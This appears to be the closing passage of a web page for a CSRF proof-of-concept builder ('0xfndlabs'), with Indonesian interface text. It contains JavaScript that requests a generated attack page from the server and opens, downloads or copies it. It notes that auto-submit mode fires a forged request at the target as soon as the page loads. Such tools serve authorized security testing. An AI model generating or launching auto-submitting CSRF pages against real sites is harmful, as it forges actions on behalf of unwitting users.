						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
						Download .html
					</button>
					<button type="button" class="btn btn-ghost" onclick="copyPoC()">
						<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
						Copy HTML
					</button>
					<span class="toast" id="cpmsg"></span>
				</div>

				<div class="curl-warn">
					PoC otomatis dibuka di tab baru setelah generate. Bila auto-submit aktif, kamu akan diminta konfirmasi dulu — PoC akan langsung mengirim request ke target begitu halaman terbuka.
					Header Origin/Referer tidak bisa di-set browser (forbidden header) — untuk CSRF lintas-origin paling reliable gunakan mode form klasik.
				</div>

				<details class="srcwrap">
					<summary>HTML Source</summary>
					<textarea readonly class="src" id="soc" spellcheck="false"><?php echo $built ? h($poc) : ''; ?></textarea>
				</details>
			</section>
		</main>

		<footer>CSRF PoC Builder · <b>0xfndlabs</b></footer>
	</div>

	<script>
		var currentPoc = '';
		function escHtml(s) {
			var d = document.createElement('div');
			d.textContent = s == null ? '' : s;
			return d.innerHTML;
		}
		function showErrors(errs) {
			var box = document.getElementById('errbox');
			if (!box) return;
			box.innerHTML = '';
			(errs || []).forEach(function (e) {
				var d = document.createElement('div');
				d.className = 'alert';
				d.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>' + escHtml(e);
				box.appendChild(d);
			});
		}
		function setPoc(poc) {
			currentPoc = poc;
			var s = document.getElementById('soc');
			if (s) s.value = poc;
		}
		function fillResult(m) {
			var set = function (id, v) { var e = document.getElementById(id); if (e) e.textContent = v; };
			set('r-method', m.method || '');
			set('r-enctype', m.enctype === 'multipart' ? 'multipart/form-data' : m.enctype === 'json' ? 'application/json' : 'application/x-www-form-urlencoded');
			set('r-target', m.target || '');
			var a = document.getElementById('r-auto');
			if (a) a.hidden = !(m.auto || m.autoChange);
			var sec = document.getElementById('result');
			if (sec) {
				sec.hidden = false;
				setTimeout(function () { sec.scrollIntoView({ behavior: 'smooth', block: 'start' }); }, 80);
			}
		}
		function pocBlobUrl() {
			var poc = currentPoc || (document.getElementById('soc') || {}).value || '';
			if (!poc) { showErrors(['Belum ada PoC untuk dibuka.']); return null; }
			return URL.createObjectURL(new Blob([poc], { type: 'text/html' }));
		}
		function openPoc() {
			var url = pocBlobUrl();
			if (!url) return false;
			var w = window.open(url, '_blank');
			setTimeout(function () { URL.revokeObjectURL(url); }, 60000);
			if (!w) showErrors(['Popup diblokir browser. Izinkan popup, atau klik tombol lagi.']);
			return !!w;
		}
		function writePoc(win, poc) {
			try {
				win.document.open();
				win.document.write(poc);
				win.document.close();
			} catch (e) {
				openPoc();
			}
		}
		function rowHTML(kind) {
			var rm = '<button type="button" class="rm" title="Hapus"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg></button>';
			if (kind === 'frows') {
				return '<input class="field mon" name="fname[]" placeholder="Field name">'
				     + '<input class="field" name="fvalue[]" placeholder="Value">' + rm;
			}
			if (kind === 'filerows') {
				return '<input class="field mon" name="files[]" placeholder="mis. file / Filedata / file[]">' + rm;
			}
			return '<input class="field mon" name="hname[]" placeholder="Header name">'
			     + '<input class="field mon" name="hvalue[]" placeholder="Header value">' + rm;
		}
		function addRow(kind) {
			var wrap = document.getElementById(kind);
			if (!wrap) return;
			var d = document.createElement('div');
			d.className = 'row-it ' + (kind === 'filerows' ? 'f1' : 'f2');
			d.innerHTML = rowHTML(kind);
			wrap.appendChild(d);
			var last = d.querySelector('input');
			if (last) last.focus();
		}
		document.addEventListener('click', function (e) {
			var b = e.target.closest('.rm');
			if (b) b.closest('.row-it').remove();
		});
		var builder = document.getElementById('builder');
		if (builder) {
			builder.addEventListener('submit', function (e) {
				e.preventDefault();
				showErrors([]);
				var btn = builder.querySelector('.generate');
				var label = btn.innerHTML;
				btn.disabled = true;
				btn.textContent = 'Generating…';
				var win = window.open('about:blank', '_blank');
				var fd = new FormData(builder);
				fd.append('ajax', '1');
				fetch(window.location.href.split('#')[0], {
					method: 'POST',
					body: fd,
					credentials: 'same-origin'
				})
					.then(function (r) {
						if (!r.ok) throw new Error('HTTP ' + r.status);
						return r.json();
					})
					.then(function (d) {
						btn.disabled = false;
						btn.innerHTML = label;
						if (!d.ok) {
							if (win) win.close();
							showErrors(d.errors || []);
							return;
						}
						setPoc(d.poc);
						var fire = d.auto || d.autoChange;
						if (fire) {
							if (window.confirm('PoC akan langsung mengirim request ke target saat tab dibuka.\nTetap buka di tab baru?')) {
								if (win) writePoc(win, d.poc); else openPoc();
							} else {
								if (win) win.close();
							}
						} else {
							if (win) writePoc(win, d.poc); else openPoc();
						}
						fillResult(d);
					})
					.catch(function (err) {
						btn.disabled = false;
						btn.innerHTML = label;
						if (win) win.close();
						showErrors(['Gagal generate: ' + ((err && err.message) || err)]);
					});
			});
		}
		function downloadPoC() {
			var url = pocBlobUrl();
			if (!url) return;
			var a = document.createElement('a');
			a.href = url;
			a.download = 'csrf-poc.html';
			a.click();
			setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
		}
		function copyPoC() {
			var t = document.getElementById('soc');
			if (!t) return;
			var poc = currentPoc || t.value;
			if (navigator.clipboard && navigator.clipboard.writeText) {
				navigator.clipboard.writeText(poc).then(function () { flash('Copied!'); }, function () { legacyCopy(t); });
			} else {
				legacyCopy(t);
			}
		}
		function legacyCopy(t) {
			t.select();
			t.setSelectionRange(0, 999999);
			var ok = false;
			try { ok = document.execCommand('copy'); } catch (e) {}
			flash(ok ? 'Copied!' : 'Copy manual (Ctrl+C).');
		}
		function flash(msg) {
			var m = document.getElementById('cpmsg');
			if (m) { m.textContent = msg; setTimeout(function () { m.textContent = ''; }, 2500); }
		}
	</script>
</body>
</html>